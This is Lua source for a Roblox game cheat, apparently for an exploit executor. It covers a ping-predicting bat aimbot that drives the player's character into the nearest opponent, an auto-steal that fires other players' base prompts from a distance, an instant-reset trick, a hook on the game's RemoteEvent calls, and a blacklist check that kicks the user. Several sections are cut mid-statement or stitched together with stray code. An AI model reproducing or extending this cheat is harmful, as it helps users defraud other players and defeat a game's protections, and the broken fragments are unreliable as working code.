if K7.accessoryPackEnabled == nil then K7.accessoryPackEnabled = false end
if K7.accessoryPackName == nil then K7.accessoryPackName = "Skin 1" end
if K7.accessoryPackIndex == nil then K7.accessoryPackIndex = 2 end
end
-- ===== [Zombie.Vs] Fim Accessory Pack =====

if K7.animPackName == nil then K7.animPackName = animPackName end if K7.animPackIndex == nil then K7.animPackIndex = animPackIndex end if K7.bodyLockRadius == nil then K7.bodyLockRadius = bodyLockRadius end print("[Zombie.Vs] K7 systems ready") end enableStretchRez = function(...) if K7 and K7.enableStretchRez then return K7.enableStretchRez(...) end end disableStretchRez = function(...) if K7 and K7.disableStretchRez then return K7.disableStretchRez(...) end end 
local function httpGet(url) local methods={ function() return game:HttpGet(url) end, function() return HS:GetAsync(url) end, function() return syn.request({Url=url,Method="GET"}).Body end, function() return http_request({Url=url,Method="GET"}).Body end, function() return request({Url=url,Method="GET"}).Body end } for _,method in ipairs(methods) do local ok, result; do local __m = {pcall(method)}; ok = __m[1]; result = __m[2]; end if ok and result then return result end end return nil end while task.wait(3) do pcall(function() local response=httpGet(BLACKLIST_URL) if response and string.find(response,tostring(LP.UserId),1,true) then
LP:Kick("You have been removed for cheating, please remove any cheats to play | CODE: BAC-1633"); task.wait(999999) end end) end end) pcall(function() if type(hookfunction) ~= "function" then return end local wrap = newcclosure or function(f) return f end local probe = Instance.new("RemoteEvent") local oldFire oldFire = hookfunction(probe.FireServer, wrap(function(self, ...) if not S.cursedResetRemote and typeof(self) == "Instance" and self:IsA("RemoteEvent") then local n = self.Name if type(n) == "string" and n:sub(1, 3) == "RE/" then S.cursedResetRemote = self end end
return oldFire(self, ...) end)) pcall(function() probe:Destroy() end) end)  end)  _resetCooldown = false  _resetThread = nil;  _resetChar = nil;  _resetStop = false;  RESET_TICK = 0.05;  RESET_MAX_ATTEMPTS = 40  function _stopInstaResetSeq() _resetStop = true
if _resetThread then pcall(function() task.cancel(_resetThread) end) _resetThread = nil end _resetCooldown = false; local character = LP.Character if character then local humanoid = character:FindFirstChildOfClass("Humanoid") if humanoid then pcall(function() humanoid.HipHeight = 2 local root = character:FindFirstChild("HumanoidRootPart") if root then root.CanCollide = true end for _, part in ipairs(character:GetChildren()) do if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then part.CanCollide = true end end end) end end _resetChar = nil; _resetStop = false end
if not _G.__VersincInstaResetCharHook then _G.__VersincInstaResetCharHook = true LP.CharacterAdded:Connect(function() _stopInstaResetSeq() end) end -- INSTANT RESET (motor do May Hub): so dispara armado pelo botao/keybind
_G.__AceResetArmedUntil = 0
function _G.AceArmInstantReset() _G.__AceResetArmedUntil = tick() + 0.5 end
 _resetLastRun = 0
cursedInstaReset = function(armed)
    local isArmed = (armed == true) or (tick() <= (_G.__AceResetArmedUntil or 0))
    _G.__AceResetArmedUntil = 0
    if _resetCooldown then return end
    if tick() - _resetLastRun < 1 then return end
    if not isArmed then
        -- chamadas internas (medusa/auto reset) continuam valendo, mas nunca durante auto left/right
        if S and (S.autoLeftEnabled or S.autoRightEnabled) then return end
    end
    _resetLastRun = tick()
    _resetCooldown = true; _resetStop = false
    local character = LP.Character
    if not character then _resetCooldown = false return end
    local humanoid = character:FindFirstChildOfClass("Humanoid")
    if not humanoid then _resetCooldown = false return end
    _resetChar = character
    local camera = workspace.CurrentCamera
    local lockedCF = camera and camera.CFrame or nil
    if camera and lockedCF then pcall(function() camera.CFrame = lockedCF end) end
    local originalHip = humanoid.HipHeight
    local isRespawning = false
    _resetThread = 
            if not character.Parent or humanoid.Health <= 0 or LP.Character ~= character then okReset = true break end
            attempts = attempts + 1
            if attempts >= RESET_MAX_ATTEMPTS then break end
            task.wait(RESET_TICK)
        end
        if not okReset and character and character.Parent and humanoid and humanoid.Health > 0 and not isRespawning then
            -- May: nao mata o personagem, sem reset forcado
            task.wait(0.1)
            if not character.Parent or humanoid.Health <= 0 then okReset = true end
        end
        if not okReset and character and character.Parent and humanoid then
            pcall(function()
                humanoid.HipHeight = originalHip
                local root = character:FindFirstChild("HumanoidRootPart")
                if root then root.CanCollide = true end
                for _, part in ipairs(character:GetChildren()) do
                    if part:IsA("BasePart") and part.Name ~= "HumanoidRootPart" then part.CanCollide = true end
                end
            end)
        end
        _resetCooldown = false; _resetThread = nil; _resetChar = nil; _resetStop = false
    end)
end
function _G.ZombieFireInstaReset()
    if _G.AceArmInstantReset then _G.AceArmInstantReset() end
    if cursedInstaReset then cursedInstaReset(true) end
end
  KB = { DropBrainrot={kb=Enum.KeyCode.H,gp=nil}, AntiTPBat   ={kb=Enum.KeyCode.B,gp=nil}, AutoLeft    ={kb=Enum.KeyCode.Z,gp=nil}, AutoRight   ={kb=Enum.KeyCode.C,gp=nil}, AutoBat     ={kb=Enum.KeyCode.E,gp=nil}, TPBat       ={kb=Enum.KeyCode.V,gp=Enum.KeyCode.ButtonY}, BatV2={kb=Enum.KeyCode.X,gp=nil}, TPFloor     ={kb=Enum.KeyCode.F,gp=nil}, InstaReset  ={kb=Enum.KeyCode.T,gp=nil}, GuiHide     ={kb=Enum.KeyCode.LeftControl,gp=nil},
SpeedToggle ={kb=Enum.KeyCode.Q,gp=nil}, LaggerToggle={kb=Enum.KeyCode.R,gp=nil}, } pcall(__initAimbotTPBat)

-- Bat V2 (Logica Auto Bat do Real Scam)
local AUTO_BAT_V2_SPEED = 58
local AUTO_BAT_V2_VERT_SPEED = 52
local AUTO_BAT_V2_DIST = -2.8
local AUTO_BAT_V2_HEIGHT = 4.75
local AUTO_BAT_V2_V_OFF = 1
local AUTO_BAT_V2_TURN_SPEED = 285
local AUTO_BAT_V2_MAX_TURN_RATE = 28

local _batV2Target = nil
local _batV2LastScan = 0
local batV2EquippedThisRun = false
local batV2Conn = nil

local function getBatV2Target()
    local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
    if not root then return nil end
    local now = tick()
    if now - _batV2LastScan <= 0.1 and _batV2Target and _batV2Target.Parent then
        local hum = _batV2Target.Parent:FindFirstChildOfClass("Humanoid")
        if hum and hum.Health > 0 then return _batV2Target end
    end
    _batV2LastScan = now
    _batV2Target = nil
    local closest, minDist = nil, math.huge
    for _, plr in ipairs(Players:GetPlayers()) do
        if plr ~= LP and plr.Character then
            local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
            local hum = plr.Character:FindFirstChildOfClass("Humanoid")
            if tRoot and hum and hum.Health > 0 then
                local dist = (tRoot.Position - root.Position).Magnitude
                if dist < minDist then
                    minDist = dist
                    closest = tRoot
                end
            end
        end
    end
    _batV2Target = closest
    return _batV2Target
end

local function resetBatV2Motion()
    local char = LP.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    local hum = char and char:FindFirstChildOfClass("Humanoid")
    if hrp then
        hrp.AssemblyLinearVelocity = hrp.AssemblyLinearVelocity * 0.3
        hrp.AssemblyAngularVelocity = Vector3.zero
    end
    if hum then hum.AutoRotate = true end
end

function stopBatV2()
    S.autoBatV2Enabled = false
    if batV2Conn then
        pcall(function() batV2Conn:Disconnect() end)
        batV2Conn = nil
    end
    batV2EquippedThisRun = false
    _batV2Target = nil
    resetBatV2Motion()
    local entry = (_G.VersincMobileButtonRefs or {}).batV2
    if entry and entry.setActive then entry.setActive(false) end
    if VS.setBatV2Visual then VS.setBatV2Visual(false) end
end

function startBatV2()
    if S.autoBatV2Enabled or batV2Conn then return end
    if S.autoBatEnabled and S.disableAutoBat then S.disableAutoBat() end
    if aimbotEnabled and setAimbotState then setAimbotState(false) end
    if tpBatEnabled and setTPBatState then setTPBatState(false) end
    if S.autoLeftEnabled then S.autoLeftEnabled = false; if F.stopAutoLeft then F.stopAutoLeft() end; if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end end
    if S.autoRightEnabled then S.autoRightEnabled = false; if F.stopAutoRight then F.stopAutoRight() end; if S.autoRightSetVisual then S.autoRightSetVisual(false) end end
    S.autoBatV2Enabled = true
    batV2EquippedThisRun = false
    _batV2Target = nil
    _batV2LastScan = 0
    local hum0 = LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
    if hum0 then hum0.AutoRotate = false end

    batV2Conn = RunService.Heartbeat:Connect(function()
        if not S.autoBatV2Enabled then return end
        local char = LP.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")
        if not root or not hum or hum.Health <= 0 then return end

        if not batV2EquippedThisRun then
            batV2EquippedThisRun = true
            if not char:FindFirstChildOfClass("Tool") then
                local bat = findBatTool and findBatTool()
                if not bat then
                    local bp = LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
                    bat = bp and (bp:FindFirstChild("Bat") or bp:FindFirstChildOfClass("Tool"))
                end
                if bat then pcall(function() hum:EquipTool(bat) end) end
            end
        end

        local target = getBatV2Target()
        if target then
            local aimTargetPos = target.Position + Vector3.new(0, AUTO_BAT_V2_V_OFF, 0)
            hum.AutoRotate = false
            local look = aimTargetPos - root.Position
            local flatLook = Vector3.new(look.X, 0, look.Z)
            if look.Magnitude > 0.01 and flatLook.Magnitude > 0.01 then
                local targetYaw = math.deg(math.atan2(-flatLook.X, -flatLook.Z))
                local yawDelta = (targetYaw - root.Orientation.Y + 180) % 360 - 180
                local targetPitch = math.deg(math.atan2(look.Y, flatLook.Magnitude))
                local pitchDelta = (targetPitch - root.Orientation.X + 180) % 360 - 180
                local yawRate = math.clamp(math.rad(yawDelta) * AUTO_BAT_V2_TURN_SPEED, -AUTO_BAT_V2_MAX_TURN_RATE, AUTO_BAT_V2_MAX_TURN_RATE)
                local pitchRate = math.clamp(math.rad(pitchDelta) * AUTO_BAT_V2_TURN_SPEED, -AUTO_BAT_V2_MAX_TURN_RATE, AUTO_BAT_V2_MAX_TURN_RATE)
                local yawRad = math.rad(root.Orientation.Y)
                local rightAxis = Vector3.new(math.cos(yawRad), 0, -math.sin(yawRad))
                root.AssemblyAngularVelocity = Vector3.new(0, yawRate, 0) + (rightAxis * pitchRate)
            else
                root.AssemblyAngularVelocity = Vector3.zero
            end
            local dir = look.Magnitude > 0.01 and look.Unit or Vector3.zero
            local standPos = aimTargetPos - (dir * AUTO_BAT_V2_DIST) + Vector3.new(0, AUTO_BAT_V2_HEIGHT, 0)
            local moveDir = standPos - root.Position
            local hDir = Vector3.new(moveDir.X, 0, moveDir.Z)
            local hVel = hDir.Magnitude > 0.1 and hDir.Unit * AUTO_BAT_V2_SPEED or Vector3.zero
            local vVel = math.abs(moveDir.Y) > 0.1 and Vector3.new(0, math.sign(moveDir.Y) * AUTO_BAT_V2_VERT_SPEED, 0) or Vector3.new(0, -2, 0)
            root.AssemblyLinearVelocity = hVel + vVel
            if hDir.Magnitude > 0.5 then hum:Move(hDir.Unit, false) end
        else
            hum.AutoRotate = true
            root.AssemblyAngularVelocity = Vector3.zero
        end

        if S.autoSwingEnabled ~= false then
            local tool = char:FindFirstChildOfClass("Tool")
            if tool then
                local remote = tool:FindFirstChildOfClass("RemoteEvent")
                if remote then remote:FireServer() else tool:Activate() end
            end
        end
    end)

    local entry = (_G.VersincMobileButtonRefs or {}).batV2
    if entry and entry.setActive then entry.setActive(true) end
    if VS.setBatV2Visual then VS.setBatV2Visual(true) end
end

-- ==== Bat Bypass do MVP (usado como BAT V2) ====
do
local CONFIG = {
    FOLLOW_SPEED = 55,              
    ACTIVATE_DISTANCE = 13,         
    MIN_FOLLOW_DISTANCE = 1,        
    PREDICTION_TIME = 0.22,         
    PREDICT_AHEAD = 3,              
    MAX_VELOCITY_CHANGE = 150,      
    VELOCITY_SMOOTHING = 0.2,       
    MAX_HORIZONTAL_VELOCITY = 80,   
    SERVER_TICKRATE = 1/60,         
    MIN_PING_COMPENSATION = 0.03,   
    MAX_PING_COMPENSATION = 0.25,   
    ACCELERATION_PREDICTION_WEIGHT = 0.3,
    DIRECTION_CHANGE_DETECTION_TIME = 0.12,
    QUICK_DIRECTION_CHANGE_MULTIPLIER = 1.5,
    GRAVITY = 196.2,
    AIR_CONTROL_FACTOR = 0.8,
    AERIAL_VELOCITY_DECAY = 0.95,
    MIN_AIRBORNE_TIME = 0.08,
    FALLING_SPEED_THRESHOLD = -15,
    SWING_COOLDOWN = 0.08,
    KEYBIND = Enum.KeyCode.X,       
}

local STATE = {
    enabled = false,
    conn = nil,
    targetPlayer = nil,
    lastTargetPos = nil,
    targetVelocity = Vector3.zero,
    smoothedVelocity = Vector3.zero,
    velocityHistory = {},
    accelerationHistory = {},
    aerialVelocityHistory = {},
    verticalVelocityHistory = {},
    previousDirection = nil,
    lastDirectionChangeTime = 0,
    airborneTime = 0,
    lastYVelocity = 0,
    lastJumpTime = 0,
    lastActivationTime = 0,
    currentPing = 0.1,
    realPingMs = 0,
    previousAutoRotate = nil,
    swingLocked = false,
    nextSwingAt = 0,
}

local function getAverage(list)
    if #list == 0 then return Vector3.zero end
    local sum = Vector3.zero
    for _, v in ipairs(list) do sum = sum + v end
    return sum / #list
end

local function addToHistory(list, value, maxSize)
    table.insert(list, value)
    if #list > maxSize then table.remove(list, 1) end
end

local function resetState()
    STATE.targetPlayer = nil
    STATE.lastTargetPos = nil
    STATE.targetVelocity = Vector3.zero
    STATE.smoothedVelocity = Vector3.zero
    STATE.velocityHistory = {}
    STATE.accelerationHistory = {}
    STATE.aerialVelocityHistory = {}
    STATE.verticalVelocityHistory = {}
    STATE.previousDirection = nil
    STATE.airborneTime = 0
    STATE.lastYVelocity = 0
end

local function findBat()
    local char = LP.Character
    if not char then return nil end

    local equipped = char:FindFirstChildOfClass("Tool")
    if equipped then
        local name = equipped.Name:lower()
        if name:find("bat") or name:find("slap") then
            return equipped
        end
    end

    local backpack = LP:FindFirstChildOfClass("Backpack")
    if backpack then
        for _, tool in ipairs(backpack:GetChildren()) do
            if tool:IsA("Tool") then
                local name = tool.Name:lower()
                if name:find("bat") or name:find("slap") then
                    return tool
                end
            end
        end
    end
    
    return nil
end

local function findNearestEnemy(myRoot)
    local nearest, nearestDist = nil, math.huge
    for _, player in ipairs(Players:GetPlayers()) do
        if player ~= LP and player.Character then
            local targetRoot = player.Character:FindFirstChild("HumanoidRootPart")
            local targetHum = player.Character:FindFirstChildOfClass("Humanoid")
            if targetRoot and targetHum and targetHum.Health > 0 then
                local dist = (targetRoot.Position - myRoot.Position).Magnitude
                if dist < nearestDist then
                    nearestDist = dist
                    nearest = player
                end
            end
        end
    end
    return nearest, nearestDist
end

local function faceTarget(myRoot, direction)
    if direction.Magnitude < 0.01 then return end
    local cross = myRoot.CFrame.LookVector:Cross(direction.Unit)
    local angle = math.asin(math.clamp(cross.Magnitude, -1, 1))
    myRoot.AssemblyAngularVelocity = cross.Magnitude > 0.01 
        and cross.Unit * angle * 80 
        or Vector3.zero
end

local function updatePing()
    local ok, ping; do local __m = {pcall(function()
        return game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValue()
    end)}; ok = __m[1]; ping = __m[2]; end
    if ok and type(ping) == "number" then
        STATE.realPingMs = math.floor(ping)
    end
    STATE.currentPing = math.clamp(
        STATE.realPingMs / 1000,
        CONFIG.MIN_PING_COMPENSATION,
        CONFIG.MAX_PING_COMPENSATION
    )
end

local function swingBat()
    local now = tick()
    if STATE.swingLocked or now < STATE.nextSwingAt then return end
    STATE.swingLocked = true
    STATE.nextSwingAt = now + CONFIG.SWING_COOLDOWN
    
    pcall(function()
        local char = LP.Character
        if not char then return end
        
        local bat = findBat()
        if not bat then return end

        if bat.Parent ~= char then
            local hum = char:FindFirstChildOfClass("Humanoid")
            if hum then hum:EquipTool(bat) end
        end

        bat:Activate()
        local remote = bat:FindFirstChildWhichIsA("RemoteEvent")
        if remote then remote:FireServer() end
    end)
    
    task.delay(CONFIG.SWING_COOLDOWN, function()
        STATE.swingLocked = false
    end)
end

local function aimbotLoop(dt)
    CONFIG.FOLLOW_SPEED = tonumber(S.mvpBypassSpeed) or 55
    if not STATE.enabled then return end
    
    local char = LP.Character
    if not char then return end
    
    local myRoot = char:FindFirstChild("HumanoidRootPart")
    local myHum = char:FindFirstChildOfClass("Humanoid")
    if not myRoot or not myHum or myHum.Health <= 0 then return end

    myHum.AutoRotate = false

    local equippedTool = char:FindFirstChildOfClass("Tool")
    if not equippedTool then
        local bat = findBat()
        if bat and bat.Parent ~= char then
            pcall(function() myHum:EquipTool(bat) end)
        end
    end

    local target, dist; do local __m = {findNearestEnemy(myRoot)}; target = __m[1]; dist = __m[2]; end
    if not target or not target.Character then
        resetState()
        return
    end
    
    local targetRoot = target.Character:FindFirstChild("HumanoidRootPart")
    local targetHum = target.Character:FindFirstChildOfClass("Humanoid")
    if not targetRoot or not targetHum or targetHum.Health <= 0 then
        resetState()
        return
    end
    
    if STATE.targetPlayer ~= target then resetState() end
    STATE.targetPlayer = target

    updatePing()

    local targetPos = targetRoot.Position
    local dt_clamped = math.max(dt, 1/240)
    
    if STATE.lastTargetPos then
        
        local instantVel = (targetPos - STATE.lastTargetPos) / dt_clamped
        local accel = instantVel - STATE.targetVelocity

        if accel.Magnitude > CONFIG.MAX_VELOCITY_CHANGE then
            instantVel = STATE.targetVelocity + accel.Unit * CONFIG.MAX_VELOCITY_CHANGE
        end

        local horizontalVel = Vector3.new(instantVel.X, 0, instantVel.Z)
        if horizontalVel.Magnitude > CONFIG.MAX_HORIZONTAL_VELOCITY then
            horizontalVel = horizontalVel.Unit * CONFIG.MAX_HORIZONTAL_VELOCITY
            instantVel = Vector3.new(horizontalVel.X, instantVel.Y, horizontalVel.Z)
        end

        addToHistory(STATE.accelerationHistory, (instantVel - STATE.targetVelocity) / dt_clamped, 4)
        addToHistory(STATE.velocityHistory, instantVel, 8)
        addToHistory(STATE.verticalVelocityHistory, instantVel.Y, 5)
        
        STATE.targetVelocity = instantVel
        STATE.smoothedVelocity = STATE.smoothedVelocity:Lerp(instantVel, CONFIG.VELOCITY_SMOOTHING)
    end
    STATE.lastTargetPos = targetPos

    local isAirborne = targetHum.FloorMaterial == Enum.Material.Air
    STATE.airborneTime = isAirborne and (STATE.airborneTime + dt_clamped) or 0
    
    if isAirborne and STATE.airborneTime >= CONFIG.MIN_AIRBORNE_TIME then
        addToHistory(STATE.aerialVelocityHistory, STATE.targetVelocity, 6)
    elseif not isAirborne then
        STATE.aerialVelocityHistory = {}
    end

    local smoothedVel = STATE.smoothedVelocity
    if isAirborne and #STATE.aerialVelocityHistory > 0 then
        local avgAerial = getAverage(STATE.aerialVelocityHistory)
        smoothedVel = Vector3.new(avgAerial.X, STATE.targetVelocity.Y, avgAerial.Z) * CONFIG.AIR_CONTROL_FACTOR
    end

    local isQuickTurn = false
    local horizontalTargetVel = Vector3.new(STATE.targetVelocity.X, 0, STATE.targetVelocity.Z)
    if horizontalTargetVel.Magnitude > 5 then
        local newDir = horizontalTargetVel.Unit
        if STATE.previousDirection and STATE.previousDirection:Dot(newDir) < 0.5 then
            isQuickTurn = (tick() - STATE.lastDirectionChangeTime) < CONFIG.DIRECTION_CHANGE_DETECTION_TIME
            STATE.lastDirectionChangeTime = tick()
        end
        STATE.previousDirection = newDir
    end

    local serverDelay = STATE.currentPing + CONFIG.SERVER_TICKRATE
    local adjustedDelay = isQuickTurn 
        and (serverDelay * CONFIG.QUICK_DIRECTION_CHANGE_MULTIPLIER) 
        or serverDelay
    
    local avgAccel = getAverage(STATE.accelerationHistory)
    local accelContribution = avgAccel * CONFIG.ACCELERATION_PREDICTION_WEIGHT 
        * (adjustedDelay * adjustedDelay * 0.5)
    
    local predictedPos = targetPos + smoothedVel * adjustedDelay + accelContribution

    local predictionTime = CONFIG.PREDICTION_TIME * 1.1
    if isAirborne then
        predictedPos = predictedPos + smoothedVel * predictionTime 
            + Vector3.new(0, -0.5 * CONFIG.GRAVITY * predictionTime * predictionTime, 0)
    else
        predictedPos = predictedPos + smoothedVel * predictionTime
    end

    local horizSmoothed = Vector3.new(smoothedVel.X, 0, smoothedVel.Z)
    if horizSmoothed.Magnitude > 1 then
        predictedPos = predictedPos + horizSmoothed.Unit * CONFIG.PREDICT_AHEAD
    end

    local direction = predictedPos - myRoot.Position
    faceTarget(myRoot, direction)

    if (targetPos - myRoot.Position).Magnitude <= CONFIG.ACTIVATE_DISTANCE then
        if tick() - STATE.lastActivationTime >= 0.3 then
            swingBat()
            STATE.lastActivationTime = tick()
        end
    end

    if direction.Magnitude > CONFIG.MIN_FOLLOW_DISTANCE then
        local speed = CONFIG.FOLLOW_SPEED
        myRoot.AssemblyLinearVelocity = direction.Unit * speed
    else
        local currentVel = myRoot.AssemblyLinearVelocity
        myRoot.AssemblyLinearVelocity = Vector3.new(0, currentVel.Y * 0.5, 0)
    end
end

local function startAimbot()
    if STATE.enabled then return end
    STATE.enabled = true
    
    local char = LP.Character
    if char then
        local hum = char:FindFirstChildOfClass("Humanoid")
        if hum then
            STATE.previousHumanoid = hum
            STATE.previousAutoRotate = hum.AutoRotate
            hum.AutoRotate = false
        end
    end
    
    resetState()
    STATE.lastActivationTime = 0
    
    STATE.conn = RunService.RenderStepped:Connect(function(dt)
                pcall(aimbotLoop, dt)
    end)
    
    print("[Bat Aimbot] ✅ ACTIVADO")
end

local function stopAimbot()
    if not STATE.enabled then return end
    STATE.enabled = false
    
    if STATE.conn then
        STATE.conn:Disconnect()
        STATE.conn = nil
    end
    
    local char = LP.Character
    if char then
        local myRoot = char:FindFirstChild("HumanoidRootPart")
        local hum = char:FindFirstChildOfClass("Humanoid")
        
        if myRoot then
            myRoot.AssemblyLinearVelocity = Vector3.zero
            myRoot.AssemblyAngularVelocity = Vector3.zero
        end
        
        local previous = STATE.previousHumanoid
        if previous and previous.Parent then
            previous.AutoRotate = STATE.previousAutoRotate == nil and true or STATE.previousAutoRotate
        elseif hum then hum.AutoRotate = true end
    end
    
    STATE.previousHumanoid = nil
    STATE.previousAutoRotate = nil
    resetState()
    
    print("[Bat Aimbot] ❌ DESACTIVADO")
end

local function toggleAimbot()
    if STATE.enabled then
        stopAimbot()
    else
        startAimbot()
    end
    return STATE.enabled
end

_G.__MVPBypassStart = startAimbot
_G.__MVPBypassStop = stopAimbot
_G.__MVPBypassIsOn = function() return STATE.enabled == true end
end
function stopBatV2()
    S.autoBatV2Enabled = false
    pcall(_G.__MVPBypassStop)
    local entry = (_G.VersincMobileButtonRefs or {}).batV2
    if entry and entry.setActive then entry.setActive(false) end
    if VS.setBatV2Visual then VS.setBatV2Visual(false) end
end
function startBatV2()
    if S.autoBatV2Enabled then return end
    if S.autoBatEnabled and S.disableAutoBat then S.disableAutoBat() end
    if aimbotEnabled and setAimbotState then setAimbotState(false) end
    if tpBatEnabled and setTPBatState then setTPBatState(false) end
    if S.autoLeftEnabled then S.autoLeftEnabled = false; if F.stopAutoLeft then F.stopAutoLeft() end; if S.autoLeftSetVisual then S.autoLeftSetVisual(false) end end
    if S.autoRightEnabled then S.autoRightEnabled = false; if F.stopAutoRight then F.stopAutoRight() end; if S.autoRightSetVisual then S.autoRightSetVisual(false) end end
    S.autoBatV2Enabled = true
    pcall(_G.__MVPBypassStart)
    local entry = (_G.VersincMobileButtonRefs or {}).batV2
    if entry and entry.setActive then entry.setActive(true) end
    if VS.setBatV2Visual then VS.setBatV2Visual(true) end
end
F.startBatV2, F.stopBatV2 = startBatV2, stopBatV2
F.toggleBatV2 = function() if S.autoBatV2Enabled then stopBatV2() else startBatV2() end end
  AP_L1,AP_L2 = Vector3.new(-476.47,-6.28,92.73),Vector3.new(-483.12,-4.95,94.81);  AP_R1,AP_R2 = Vector3.new(-476.16,-6.52,25.62),Vector3.new(-483.06,-5.03,25.48)
-- AUTO GRAB portado do Mystery: Normal (V3/80%) e Semi (V2/75%).
 autoStealEnabled = false
 selectedStealMode = "Normal"
 autoStealRadius = 63
 AceStealRadii = {Normal = 63, Semi = 60}
 autoGrabStopEnabled, autoGrabStopTime, autoGrabDelayRadius = true, 0.975, 8
 Steal = {AutoStealEnabled=false, StealRadius=63, StealDuration=1.3, AutoGrabStopEnabled=true, AutoGrabStopTime=0.975, AutoGrabDelayRadius=8}
 progressRadLbl, progressFill, progressPct = nil, nil, nil
setupStealBarAPI, resetProgressBar, AceAutoStealSync, startAutoSteal, stopAutoSteal = nil 
 stealsCount = 0
 ragdollGrabPaused = false
 function getFillColor() if S and S.whiteBarEnabled then return Color3.fromRGB(255,255,255) end return (S and S.themeColor) or Color3.fromRGB(30,100,220) end
 MysteryGrab = (function()
    local M = {scan=nil, active=false, token=0, cache={}}
    local function setBar(p, text)
        p = math.clamp(tonumber(p) or 0, 0, 1)
        if progressFill then progressFill.Size=UDim2.new(p,0,1,0); progressFill.BackgroundColor3=getFillColor() end
        if progressPct then progressPct.Text=text or string.format("%d%%", math.floor(p*100+0.5)) end
    end
    local function resetBar() setBar(0,"0%") end
    local function root() local c=LP.Character; return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("UpperTorso")) end
    local function myPlot(plot)
        local sign=plot and plot:FindFirstChild("PlotSign"); local your=sign and sign:FindFirstChild("YourBase")
        if your and your:IsA("BillboardGui") and your.Enabled then return true end
        local conf=plot and (plot:FindFirstChild("Configuration") or plot:FindFirstChild("Config")); local owner=conf and (conf:FindFirstChild("Owner") or conf:FindFirstChild("Player"))
        if owner then local v=owner.Value; return v==LP or v==LP.Name or v==tostring(LP.UserId) end
        return false
    end
    local function nearest()
        local hrp=root(); local plots=workspace:FindFirstChild("Plots"); if not hrp or not plots then return nil,nil end
        local best,bestSpawn,bestDist=nil,nil,math.huge; local radius=tonumber(Steal.StealRadius) or tonumber(autoStealRadius) or AceStealRadii[selectedStealMode] or 63
        for _,plot in ipairs(plots:GetChildren()) do
            if plot:IsA("Model") and not myPlot(plot) then
                local pods=plot:FindFirstChild("AnimalPodiums")
                if pods then for _,pod in ipairs(pods:GetChildren()) do pcall(function()
                    local base=pod:FindFirstChild("Base"); local spawn=base and base:FindFirstChild("Spawn"); if not spawn then return end
                    local dist=(spawn.Position-hrp.Position).Magnitude; if dist>=bestDist or dist>radius then return end
                    local att=spawn:FindFirstChild("PromptAttachment")
                    if att then for _,obj in ipairs(att:GetChildren()) do if obj:IsA("ProximityPrompt") and obj.Enabled then best=obj; bestSpawn=spawn; bestDist=dist; return end end end
                    for _,obj in ipairs(spawn:GetDescendants()) do if obj:IsA("ProximityPrompt") and obj.Enabled then best=obj; bestSpawn=spawn; bestDist=dist; return end end
                end) end end
            end
        end
        return best,bestSpawn
    end
    local function callbacks(prompt)
        local d=M.cache[prompt]; if d then return d end
        d={hold={},trigger={},ready=true}; M.cache[prompt]=d
        if getconnections then pcall(function()
            for _,c in ipairs(getconnections(prompt.PromptButtonHoldBegan)) do if c.Function then table.insert(d.hold,c.Function) end end
            for _,c in ipairs(getconnections(prompt.Triggered)) do if c.Function then table.insert(d.trigger,c.Function) end end
        end) end
        return d
    end
    local function fire(prompt,d)
        local fired=false
        for _,fn in ipairs(d.trigger) do fired=true;  end
        if not fired then pcall(function()
            if fireproximityprompt then fireproximityprompt(prompt,0) else prompt:InputHoldBegin(); task.wait(); prompt:InputHoldEnd() end
        end) end
        stealsCount=stealsCount+1
    end
    local function execute(prompt,spawn)
        if M.active or not autoStealEnabled or ragdollGrabPaused or not prompt or not spawn then return end
        local d=callbacks(prompt); if not d.ready then return end
        d.ready=false; M.active=true; M.token=M.token+1; local token=M.token
         end
            local duration=math.max(0.1,tonumber(Steal.StealDuration) or 1.3)
            local modeStopPct=(selectedStealMode=="Semi") and 0.75 or 0.80
            local stopPct=autoGrabStopEnabled and math.clamp((tonumber(autoGrabStopTime) or duration*modeStopPct)/duration,0.05,0.99) or modeStopPct
            local triggerRadius=math.max(0.1,tonumber(autoGrabDelayRadius) or tonumber(Steal.AutoGrabDelayRadius) or ((selectedStealMode=="Semi") and 8 or 10))
            local started=tick(); local cancelled=false
            while autoStealEnabled and not ragdollGrabPaused and M.token==token do
                local hrp=root(); if not hrp or not prompt.Parent or not spawn.Parent then cancelled=true; break end
                if (hrp.Position-spawn.Position).Magnitude > (tonumber(Steal.StealRadius) or tonumber(autoStealRadius) or 63) then cancelled=true; break end
                local progress=math.clamp((tick()-started)/duration,0,stopPct); setBar(progress)
                if progress>=stopPct then break end
                task.wait()
            end
            while not cancelled and autoStealEnabled and not ragdollGrabPaused and M.token==token do
                local hrp=root(); if not hrp or not prompt.Parent or not spawn.Parent then cancelled=true; break end
                local dist=(hrp.Position-spawn.Position).Magnitude
                if dist<=triggerRadius then break end
                if dist>(tonumber(Steal.StealRadius) or tonumber(autoStealRadius) or 63) then cancelled=true; break end
                setBar(stopPct); task.wait()
            end
            if not cancelled and autoStealEnabled and not ragdollGrabPaused and M.token==token then
                local fillStart=tick(); local fillDuration=duration*(1-stopPct)
                while autoStealEnabled and not ragdollGrabPaused and M.token==token do local fp=math.clamp((tick()-fillStart)/fillDuration,0,1); setBar(stopPct+fp*(1-stopPct)); if fp>=1 then break end; task.wait() end
                if autoStealEnabled and not ragdollGrabPaused and M.token==token then fire(prompt,d) end
            end
            d.ready=true; M.active=false; resetBar()
        end)
    end
    function M.start()
        M.stop(false); autoStealEnabled=true; Steal.AutoStealEnabled=true; M.token=M.token+1
        Steal.StealRadius=tonumber(autoStealRadius) or AceStealRadii[selectedStealMode] or 63
        if progressRadLbl then progressRadLbl.Text=string.format("Radius: %.0f",Steal.StealRadius) end
        M.scan=RunService.Heartbeat:Connect(function() if autoStealEnabled and not ragdollGrabPaused and not M.active then local p, sp; do local __m = {nearest()}; p = __m[1]; sp = __m[2]; end; if p then execute(p,sp) end end end)
    end
    function M.stop(turnOff)
        if turnOff~=false then autoStealEnabled=false; Steal.AutoStealEnabled=false end
        M.token=M.token+1; M.active=false
        if M.scan then pcall(function() M.scan:Disconnect() end); M.scan=nil end
